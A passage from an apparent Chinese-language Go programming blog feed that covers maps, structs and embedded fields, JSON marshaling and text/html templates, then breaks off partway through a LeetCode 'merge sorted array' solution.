k(y)才成立。然后创建一个key为string类型的map，在每次对map操作时先用k辅助函数将slice转化为string类型。</p><p>下面的例子演示了如何使用map来记录提交相同的字符串列表的次数。它使用了<code>fmt.Sprintf</code>函数将字符串列表转换为一个字符串以用于map的key，通过%q参数忠实地记录每个字符串元素的信息：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">k</span><span class="params">(list []<span class="type">string</span>)</span></span> <span class="type">string</span> &#123; <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%q&quot;</span>, list) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(list []<span class="type">string</span>)</span></span> &#123; m[k(list)]++ &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Count</span><span class="params">(list []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> m[k(list)] &#125;</span><br></pre></td></tr></table></figure><p>同样的技术可以处理其他不可比较的key类型，比如结构体等；也可以拿来自定义key比较，比如比较字符串时忽略key的大小写。</p><p>Map的value也可以是一些聚合类型，比如slice或者map，利用这一点我们可以实现一些小技巧：比如嵌套哈希表实现图的存储。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> graph = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">addEdge</span><span class="params">(from, to <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">     edges := graph[from]</span><br><span class="line">     <span class="keyword">if</span> edges == <span class="literal">nil</span> &#123; <span class="comment">//如果顶点不存在则创建新顶点</span></span><br><span class="line">         edges = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>)</span><br><span class="line">         graph[from] = edges</span><br><span class="line">     &#125;</span><br><span class="line">     edges[to] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasEdge</span><span class="params">(from, to <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> graph[from][to]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>addEdge</code>函数<strong>惰性初始化</strong>map是一个惯用方式，也就是说在每个值首次作为key时才初始化。<code>hasEdge</code>函数显示了如何让map的零值也能正常工作；即使from到to的边不存在，graph[from][to]依然可以返回一个有意义的结果</p><h3 id="结构体"><a class="markdownIt-Anchor" href="#结构体"></a> 结构体</h3><p>结构体是一种聚合的数据类型，是由零个或多个任意类型的值聚合成的实体。每个值称为结构体的成员。结构体把多个信息绑定到一个实体中，使其可以作为一个整体的单元被复制、作为函数的参数或返回值，亦或是被储存到数组中等。结构体是一个更加自由的数据类型，允许你定义多个变量成员。</p><p>换句话说，Go中的结构体只是一个多个变量成员的集合体，类似于Python中类的属性，C语言的结构体。因为Go中并没有类的概念，所以可以通过使用结构体和方法来实现面向对象编程的某些特性。</p><p>例如，你可以定义一个名为 <code>Circle</code> 的结构体，然后为 <code>Circle</code> 定义一个名为 <code>Area</code> 的方法：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">    Radius <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Circle)</span></span> Area() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.Radius * c.Radius</span><br><span class="line">&#125;<span class="comment">//这里定义了一个方法，c Circle作为一个接收者</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果你想定义一个函数，应该写成如下形式</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Area</span> <span class="params">(c Circle)</span></span> <span class="type">float64</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> math.Pi * c.Radius * c.Radius</span><br><span class="line">&#125;<span class="comment">//函数没有接收者，形式上来讲只是把方法名移至参数前作为函数名</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Circle</code> 是一个结构体，它有一个 <code>Radius</code> 字段。<code>Area</code> 是一个方法，它计算并返回圆的面积。你可以像这样使用它：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c := Circle&#123;Radius: <span class="number">5</span>&#125; <span class="comment">//显式声明</span></span><br><span class="line"><span class="keyword">var</span> c Circle <span class="comment">//隐式声明</span></span><br><span class="line">c.Radius = <span class="number">5</span> <span class="comment">//可以通过点号来访问结构体成员</span></span><br><span class="line">fmt.Println(c.Area())  <span class="comment">// 输出 &quot;78.53981633974483&quot;</span></span><br></pre></td></tr></table></figure><p>值得一提的是，点操作符也可以和指向结构体的指针一起工作，这点不同于C语言中需要用<code>-&gt;</code>来访问结构体指针指向的结构体内成员。</p><p>结构体成员的输入顺序也有重要的意义。我们也可以将Position成员合并（因为也是字符串类型），或者是交换Name和Address出现的先后顺序，那样的话就是定义了不同的结构体类型。（C语言也有类似的性质）</p><p>如果结构体成员名字是以大写字母开头的，那么该成员就是导出的；这点有些类似于Python、C++、PHP中的private私有属性，但是也有不同：前者是基于包的私有性，而后三者是基于类的私有性。也就是说，Go的结构体成员变量是否导出只是决定了在包外能否访问，而在包内的代码可以访问所有的成员变量。</p><p>可以把结构体作为函数的参数或者返回值，但要注意传递结构体时都是传递结构体的拷贝而不是本身。如果你想提高传输效率或者修改结构体成员的值，那么你就需要传递结构体的指针。</p><p>结构体的成员如果都是可比较的类型，那么就可以用<code>==</code>或者<code>!=</code>来进行结构体之间的比较。同样的，可比较的结构体也可以作为map的键名。</p><h4 id="匿名成员"><a class="markdownIt-Anchor" href="#匿名成员"></a> 匿名成员</h4><p>在Go结构体中可以通过定义匿名成员变量的方式来优化访问成员的机制。</p><p>比如我们有如下代码。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Point <span class="keyword">struct</span> &#123;</span><br><span class="line">     X, Y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">     Center Point</span><br><span class="line">     Radius <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Wheel <span class="keyword">struct</span> &#123;</span><br><span class="line">     Circle Circle</span><br><span class="line">     Spokes <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样相当于Circle嵌套了Point，而Wheel又嵌套了Circle。这么做会让结构体的类型变得清晰，同时也会导致访问结构体成员的步骤变得繁琐。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w Wheel</span><br><span class="line">w.Circle.Center.X = <span class="number">8</span></span><br><span class="line">w.Circle.Center.Y = <span class="number">8</span></span><br><span class="line">w.Circle.Radius = <span class="number">5</span></span><br><span class="line">w.Spokes = <span class="number">20</span></span><br></pre></td></tr></table></figure><p>但如果我们通过定义匿名成员变量，就可以简化这一步骤：我们只声明一个成员对应的数据类型而不指名成员的名字。匿名成员的数据类型必须是命名的类型或指向一个命名的类型的指针</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Circle <span class="keyword">struct</span> &#123;</span><br><span class="line">     Point</span><br><span class="line">     Radius <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Wheel <span class="keyword">struct</span> &#123;</span><br><span class="line">     Circle</span><br><span class="line">     Spokes <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们可以直接访问叶子属性而不需要给出完整的路径：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w Wheel</span><br><span class="line">w.X = <span class="number">8</span> <span class="comment">// equivalent to w.Circle.Point.X = 8</span></span><br><span class="line">w.Y = <span class="number">8</span> <span class="comment">// equivalent to w.Circle.Point.Y = 8</span></span><br><span class="line">w.Radius = <span class="number">5</span> <span class="comment">// equivalent to w.Circle.Radius = 5</span></span><br><span class="line">w.Spokes = <span class="number">20</span></span><br></pre></td></tr></table></figure><p>在右边的注释中给出的显式形式访问这些叶子成员的语法依然有效，因此匿名成员并不是真的无法访问了。所以说匿名变量只是可选的，你仍然可以通过传统的方法访问原有变量，但我们更倾向于直接省略。<strong>匿名成员变量的作用其实类似于直接把嵌套的结构成员直接复制到了当前结构体，便于你直接访问</strong>。</p><p>因为匿名成员也有一个隐式的名字，因此不能同时包含两个类型相同的匿名成员，这会导致名字冲突。同时，因为成员的名字是由其类型隐式地决定的，所以匿名成员也有可见性的规则约束。</p><p>到目前为止，我们看到匿名成员特性只是<strong>对访问嵌套成员的点运算符提供了简短的语法糖。<strong>稍后，我们将会看到匿名成员并不要求是结构体类型；其实</strong>任何命名的类型</strong>都可以作为结构体的匿名成员。但是为什么要嵌入一个没有任何子成员类型的匿名成员类型呢？</p><p>答案是匿名类型的<strong>方法集</strong>。简短的点运算符语法可以用于选择匿名成员嵌套的成员，<strong>也可以用于访问它们的方法。<strong>实际上，外层的结构体不仅仅是获得了匿名成员类型的所有成员，而且</strong>也获得了该类型导出的全部的方法。这</strong>个机制可以用于将一些有简单行为的对象组合成有复杂行为的对象。组合是Go语言中面向对象编程的核心，我们将在后续专门讨论。</p><h3 id="json"><a class="markdownIt-Anchor" href="#json"></a> JSON</h3><blockquote><p>JavaScript对象表示法（JSON）是一种用于发送和接收结构化信息的标准协议。在类似的协议中，JSON并不是唯一的一个标准协议。 XML（§7.14）、ASN.1和Google的Protocol Buffers都是类似的协议，并且有各自的特色，但是由于简洁性、可读性和流行程度等原因，JSON是应用最广泛的一个。</p></blockquote><p>我们将对重要的encoding/json包的用法做个概述。</p><p>比如有代码如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Movie <span class="keyword">struct</span> &#123;</span><br><span class="line">     Title <span class="type">string</span></span><br><span class="line">     Year <span class="type">int</span> <span class="string">`json:&quot;released&quot;`</span></span><br><span class="line">     Color <span class="type">bool</span> <span class="string">`json:&quot;color,omitempty&quot;`</span></span><br><span class="line">     Actors []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> movies = []Movie&#123;</span><br><span class="line">     &#123;Title: <span class="string">&quot;Casablanca&quot;</span>, Year: <span class="number">1942</span>, Color: <span class="literal">false</span>,</span><br><span class="line">     Actors: []<span class="type">string</span>&#123;<span class="string">&quot;Humphrey Bogart&quot;</span>, <span class="string">&quot;Ingrid Bergman&quot;</span>&#125;&#125;,</span><br><span class="line">     &#123;Title: <span class="string">&quot;Cool Hand Luke&quot;</span>, Year: <span class="number">1967</span>, Color: <span class="literal">true</span>,</span><br><span class="line">     Actors: []<span class="type">string</span>&#123;<span class="string">&quot;Paul Newman&quot;</span>&#125;&#125;,</span><br><span class="line">     &#123;Title: <span class="string">&quot;Bullitt&quot;</span>, Year: <span class="number">1968</span>, Color: <span class="literal">true</span>,</span><br><span class="line">     Actors: []<span class="type">string</span>&#123;<span class="string">&quot;Steve McQueen&quot;</span>, <span class="string">&quot;Jacqueline Bisset&quot;</span>&#125;&#125;,</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种数据结构就很适合JSON格式。将一个Go语言中类似movies的结构体slice转为JSON的过程叫编组（marshaling）。编组通过调用<code>json.Marshal</code>函数完成</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">data, err := json.Marshal(movies)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">     log.Fatalf(<span class="string">&quot;JSON marshaling failed: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data)</span><br></pre></td></tr></table></figure><p>Marshal函数返回一个编码后的字节slice，包含很长的字符串，并且没有空白缩进；</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;Title&quot;</span>:<span class="string">&quot;Casablanca&quot;</span>,<span class="string">&quot;released&quot;</span>:<span class="number">1942</span>,<span class="string">&quot;Actors&quot;</span>:[<span class="string">&quot;Humphrey Bogart&quot;</span>,<span class="string">&quot;Ingr</span></span><br><span class="line"><span class="string">id Bergman&quot;</span>]&#125;,&#123;<span class="string">&quot;Title&quot;</span>:<span class="string">&quot;Cool Hand Luke&quot;</span>,<span class="string">&quot;released&quot;</span>:<span class="number">1967</span>,<span class="string">&quot;color&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;Ac</span></span><br><span class="line"><span class="string">tors&quot;</span>:[<span class="string">&quot;Paul Newman&quot;</span>]&#125;,&#123;<span class="string">&quot;Title&quot;</span>:<span class="string">&quot;Bullitt&quot;</span>,<span class="string">&quot;released&quot;</span>:<span class="number">1968</span>,<span class="string">&quot;color&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;</span></span><br><span class="line"><span class="string">Actors&quot;</span>:[<span class="string">&quot;Steve McQueen&quot;</span>,<span class="string">&quot;Jacqueline Bisset&quot;</span>]&#125;]</span><br></pre></td></tr></table></figure><p><code>json.MarshalIndent</code>函数将产生整齐缩进的输出。该函数有两个额外的字符串参数用于表示每一行输出的前缀和每一个层级的缩进：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">data, err := json.MarshalIndent(movies, <span class="string">&quot;&quot;</span>, <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> log.Fatalf(<span class="string">&quot;JSON marshaling failed: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="string">&quot;Title&quot;</span>: <span class="string">&quot;Casablanca&quot;</span>,</span><br><span class="line">         <span class="string">&quot;released&quot;</span>: <span class="number">1942</span>,</span><br><span class="line">         <span class="string">&quot;Actors&quot;</span>: [</span><br><span class="line">             <span class="string">&quot;Humphrey Bogart&quot;</span>,</span><br><span class="line">             <span class="string">&quot;Ingrid Bergman&quot;</span></span><br><span class="line">         ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="string">&quot;Title&quot;</span>: <span class="string">&quot;Cool Hand Luke&quot;</span>,</span><br><span class="line">         <span class="string">&quot;released&quot;</span>: <span class="number">1967</span>,</span><br><span class="line">         <span class="string">&quot;color&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">         <span class="string">&quot;Actors&quot;</span>: [</span><br><span class="line">         <span class="string">&quot;Paul Newman&quot;</span></span><br><span class="line">         ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="string">&quot;Title&quot;</span>: <span class="string">&quot;Bullitt&quot;</span>,</span><br><span class="line">         <span class="string">&quot;released&quot;</span>: <span class="number">1968</span>,</span><br><span class="line">         <span class="string">&quot;color&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">         <span class="string">&quot;Actors&quot;</span>: [</span><br><span class="line">             <span class="string">&quot;Steve McQueen&quot;</span>,</span><br><span class="line">             <span class="string">&quot;Jacqueline Bisset&quot;</span></span><br><span class="line">         ]</span><br><span class="line">     &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在编码时，默认使用Go语言结构体的成员名字作为JSON的对象。其中Year名字的成员在编码后变成了released，还有Color成员编码后变成了小写字母开头的color。这是因为结构体成员<strong>Tag</strong>所导致的。**一个结构体成员Tag是和在编译阶段关联到该成员的元信息字符串。**标签是一种元信息，可以被反射机制读取。例如，你可以使用标签来指定一个字段在 JSON 中的名字：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Year <span class="type">int</span> <span class="string">`json:&quot;released&quot;`</span></span><br><span class="line">Color <span class="type">bool</span> <span class="string">`json:&quot;color,omitempty&quot;`</span></span><br></pre></td></tr></table></figure><p>json开头键名对应的值用于控制encoding/json包的编码和解码的行为，并且encoding/…下面其它的包也遵循这个约定。成员Tag中json对应值的第一部分用于指定JSON对象的名字。Color成员的Tag还带了一个额外的omitempty选项，表示当Go语言结构体成员为空或零值时不生成该JSON对象（这里false为零值）。</p><p>编码的逆操作是解码，对应将JSON数据解码为Go语言的数据结构，Go语言中一般叫unmarshaling，通过<code>json.Unmarshal</code>函数完成。下面的代码将JSON格式的电影数据解码为一个结构体slice，结构体中只有Title成员。</p><p>通过定义合适的Go语言数据结构，我们可以选择性地解码JSON中感兴趣的成员。当Unmarshal函数调用返回，slice将被只含有Title信息的值填充，其它JSON成员将被忽略。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> titles []<span class="keyword">struct</span>&#123; Title <span class="type">string</span> &#125;</span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal(data, &amp;titles); err != <span class="literal">nil</span> &#123;</span><br><span class="line">     log.Fatalf(<span class="string">&quot;JSON unmarshaling failed: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(titles) <span class="comment">// &quot;[&#123;Casablanca&#125; &#123;Cool Hand Luke&#125; &#123;Bullitt&#125;]&quot;</span></span><br></pre></td></tr></table></figure><h3 id="文本和html模板"><a class="markdownIt-Anchor" href="#文本和html模板"></a> 文本和HTML模板</h3><p>Go 语言的 <code>text/template</code> 和 <code>html/template</code> 包提供了数据驱动的模板，用于生成文本和 HTML 格式的输出。</p><p>一个模板是一个字符串或一个文件，里面包含了一个或多个由双花括号包含的 <code>&#123;&#123;action&#125;&#125;</code> 对象。大部分的字符串只是按字面值打印，但是对于actions部分将触发其它的行为。每个actions都包含了一个用模板语言书写的表达式，一个action虽然简短但是可以输出复杂的打印值，模板语言包含通过选择结构体的成员、调用函数或方法、表达式控制流if-else语句和range循环语句，还有其它实例化模板等诸多特性。</p><h4 id="texttemplate"><a class="markdownIt-Anchor" href="#texttemplate"></a> text/template</h4><p><code>text/template</code> 包提供了一种机制，让你可以使用文本模板生成任何类型的文本，包括 HTML、XML 或者其他文本文档。你可以在模板中使用数据和控制结构（如循环和条件判断）来动态生成文本。</p><p>下面是一个简单的例子：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;text/template&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">daysAgo</span><span class="params">(t time.Time)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="type">int</span>(time.Since(t).Hours() / <span class="number">24</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := template.New(<span class="string">&quot;person template&quot;</span>)</span><br><span class="line"></span><br><span class="line">    t, _ = t.Parse(<span class="string">&quot;Name: &#123;&#123;.Name&#125;&#125;, Age: &#123;&#123;.Age&#125;&#125;\n&quot;</span>)</span><br><span class="line">    p := Person&#123;Name: <span class="string">&quot;John Doe&quot;</span>, Age: <span class="number">50</span>&#125;</span><br><span class="line"></span><br><span class="line">    t.Execute(os.Stdout, p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们定义了一个 <code>Person</code> 结构体，并创建了一个模板，该模板使用 <code>&#123;&#123;.Name&#125;&#125;</code> 和 <code>&#123;&#123;.Age&#125;&#125;</code> 来引用 <code>Person</code> 结构体的字段。然后我们创建了一个 <code>Person</code> 对象，并将其传递给模板的 <code>Execute</code> 方法，最后将结果输出到标准输出。</p><p><code>.</code> 是一个特殊的符号，它代表当前的上下文或&quot;当前值&quot;。这个上下文是动态的，会随着模板的执行而改变。在这个例子中，模板被调用时的参数是一个 <code>Person</code> 类型的变量。因此，当模板系统看到 <code>&#123;&#123;.Name&#125;&#125;</code> 时，它会从 <code>Person</code> 类型的变量中取出 <code>Name</code> 这个字段的值。</p><p>这种动态的上下文管理方式使得 Go 语言模板系统在处理复杂的数据结构时非常方便和强大。</p><p>生成模板的输出需要两个处理步骤。第一步是要分析模板并转为内部表示，然后基于指定的输入执行模板。分析模板部分一般只需要执行一次。下面的代码创建并分析上面定义的模板templ。注意方法调用链的顺序：template.New先创建并返回一个模板；Funcs方法将daysAgo等自定义函数注册到模板中，并返回模板；最后调用Parse函数分析模板。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">report, err := template.New(<span class="string">&quot;report&quot;</span>).</span><br><span class="line">     Funcs(template.FuncMap&#123;<span class="string">&quot;daysAgo&quot;</span>: daysAgo&#125;).</span><br><span class="line">     Parse(templ)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"> log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为模板通常在编译时就测试好了，如果模板解析失败将是一个致命的错误。template.Must辅助函数可以简化这个致命错误的处理：它接受一个模板和一个error类型的参数，检测error是否为nil（如果不是nil则发出panic异常），然后返回传入的模板。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> report = template.Must(template.New(<span class="string">&quot;issuelist&quot;</span>).</span><br><span class="line"> Funcs(template.FuncMap&#123;<span class="string">&quot;daysAgo&quot;</span>: daysAgo&#125;).</span><br><span class="line"> Parse(templ))</span><br></pre></td></tr></table></figure><h4 id="htmltemplate"><a class="markdownIt-Anchor" href="#htmltemplate"></a> html/template</h4><p><code>html/template</code> 包的功能与 <code>text/template</code> 非常相似，但它提供了一些额外的功能，特别是自动的、上下文敏感的 HTML 和 JavaScript 转义，这对于防止跨站脚本（XSS）攻击非常有用。</p><p>下面是一个简单的例子：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;html/template&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name <span class="type">string</span></span><br><span class="line">    Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := template.New(<span class="string">&quot;person template&quot;</span>)</span><br><span class="line"></span><br><span class="line">    t, _ = t.Parse(<span class="string">&quot;&lt;p&gt;Name: &#123;&#123;.Name&#125;&#125;, Age: &#123;&#123;.Age&#125;&#125;&lt;/p&gt;\n&quot;</span>)</span><br><span class="line">    p := Person&#123;Name: <span class="string">&quot;John Doe&quot;</span>, Age: <span class="number">50</span>&#125;</span><br><span class="line"></span><br><span class="line">    t.Execute(os.Stdout, p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子与之前的 <code>text/template</code> 例子非常相似，只是我们使用的是 <code>html/template</code> 包，而且模板是 HTML 格式的。</p><p>在这两个包中，你都可以使用一些内置的函数，例如 <code>range</code>（用于循环）、<code>if</code>（用于条件判断）以及许多其他函数。你也可以定义自己的函数，并在模板中使用它们。</p><p>模板中可以包含多种动作，包括：</p><ul><li><code>&#123;&#123;.&#125;&#125;</code>：表示当前的值。</li><li><code>&#123;&#123;.Field&#125;&#125;</code>：表示当前值的 <code>Field</code> 字段。</li><li><code>&#123;&#123;range .&#125;&#125;...&#123;&#123;end&#125;&#125;</code>：遍历当前的值（必须是数组、切片或映射）。</li><li><code>&#123;&#123;if .&#125;&#125;...&#123;&#123;end&#125;&#125;</code>：如果当前的值为真，则输出 <code>...</code>。</li></ul><p>模板支持函数，你可以在模板中使用预定义的函数，也可以添加自定义的函数。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用预定义的函数</span></span><br><span class="line"><span class="keyword">const</span> tpl = <span class="string">`&#123;&#123;len .&#125;&#125;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加自定义的函数</span></span><br><span class="line">funcMap := template.FuncMap&#123;</span><br><span class="line">    <span class="string">&quot;lower&quot;</span>: strings.ToLower,</span><br><span class="line">&#125;</span><br><span class="line">t := template.New(<span class="string">&quot;test&quot;</span>).Funcs(funcMap)</span><br><span class="line">t, err := t.Parse(<span class="string">`&#123;&#123;lower .&#125;&#125;`</span>)</span><br></pre></td></tr></table></figure><p>这一部分内容先不展开过多，更具体的内容可以查阅文档。</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>在编程中，数据类型通常被分为两种主要的类别：值类型和引用类型。这两种类型的主要区别在于它们的赋值和比较行为。</p><ol><li>值类型：当我们创建一个值类型的变量时，变量直接存储的是值，而不是值的引用。因此，当我们将一个值类型的变量赋值给另一个变量时，实际上是在复制整个值。如果我们修改一个变量，不会影响到另一个变量。在Go语言中，基本类型（如int, float, bool, string等）、数组和结构体都是值类型。</li><li>引用类型：与值类型不同，引用类型的变量存储的是值的地址，也就是引用，而不是值本身。因此，当我们将一个引用类型的变量赋值给另一个变量时，实际上是在复制引用，这两个变量会指向同一个值。如果我们修改一个变量，会影响到所有指向同一个值的变量。在Go语言中，slice, map, channel, interface, function等都是引用类型。</li></ol><p>所以，当我们说Go语言中的数组是值类型，意思就是数组在赋值和函数传参时，会进行整个数组的复制，修改一个数组不会影响到另一个数组。这与引用类型的行为不同，引用类型在赋值和函数传参时，只会复制引用，多个变量可以共享同一个值。</p><p>反观C语言，C语言中没有直接对应于&quot;值类型&quot;和&quot;引用类型&quot;的概念，但是有相似的行为模式。</p><p>在C语言中，所有的变量默认都是值类型，也就是说，当你把一个变量赋值给另一个变量时，你实际上是在复制那个值。如果你修改了一个变量，这不会影响到其他的变量。这包括C语言中的所有基本类型，比如<code>int</code>，<code>char</code>，<code>float</code>，<code>double</code>等。</p><p>然而，C语言也提供了指针类型，这可以用来模拟类似引用类型的行为。指针是一个变量，它的值是另一个变量的内存地址。如果你有一个指针指向一个变量，然后通过这个指针修改那个变量的值，那么所有的指向那个同一变量的指针都会&quot;看到&quot;这个改变。</p><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/f5c4c658c9623ef310f3d678caabff4c.jpeg" alt="f5c4c658c9623ef310f3d678caabff4c" /></p>]]></content>
      
      
      <categories>
          
          <category> Go!Go!Go! </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode经典面试150题题解</title>
      <link href="/posts/1f3d16f9a7e2/"/>
      <url>/posts/1f3d16f9a7e2/</url>
      
        <content type="html"><![CDATA[<h1 id="88-合并两个有序数组"><a class="markdownIt-Anchor" href="#88-合并两个有序数组"></a> 88. 合并两个有序数组</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/merge-sorted-array/description/">88. 合并两个有序数组</a></p></blockquote><h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2><p>使用“双指针”技术，从两个数组的末尾开始比较元素，然后将较大的元素放入nums1的末尾。这样，我们可以确保nums1在每一步都保持有序。这种方法的关键在于我们从后往前填充nums1，这样就不会覆盖nums1中尚未处理的元素。</p><h2 id="解题方法"><a class="markdownIt-Anchor" href="#解题方法"></a> 解题方法</h2><ol><li><p>初始化两个指针 p1 和 p2 到 nums1 和 nums2 的初始元素的最后一个位置上，然后再用一个指针 p 指向 nums1 的最后一个位置。</p></li><li><p>比较 nums1[p1] 和 nums2[p2] 的值，将较大的值放入 nums1[p] 的位置上，然后将 p 指针和较大值的指针都向前移动一位。</p></li><li><p>重复步骤 2，直到 p1 或 p2 小于 0，这意味着 nums1 或 nums2 的元素已经全部放入 nums1 中。</p></li><li><p>如果 p2 还没有小于 0，那么将 nums2 中剩余的元素复制到 nums1 的前面。</p></li></ol><h2 id="复杂度"><a class="markdownIt-Anchor" href="#复杂度"></a> 复杂度</h2><p>时间复杂度:<br />时间复杂度是 O(m+n)，其中m和n分别是 nums1 和 nums2 的长度。在最坏的情况下，我们可能需要遍历 nums1 和 nums2 中的所有元素。因为我们只遍历每个元素一次，所以时间复杂度是线性的。</p><p>空间复杂度:<br />空间复杂度是O(1)。这是因为我们没有使用额外的空间来存储数据。所有的操作都是在原地进行的，我们只是使用了几个额外的变量来保存索引。因此，空间复杂度是常数的。</p><h2 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">merge</span><span class="params">(nums1 []<span class="type">int</span>, m <span class="type">int</span>, nums2 []<span class="type">int</span>, n <span class="type">int</span>)</span></span>  &#123;</span><br><span class="line">    p1:=m<span class="number">-1</span></span><br><span class="line">    p2:=n<span class="number">-1</span></span><br><span class="line">    p:=m+n<span class="number">-1</span></span><br><span 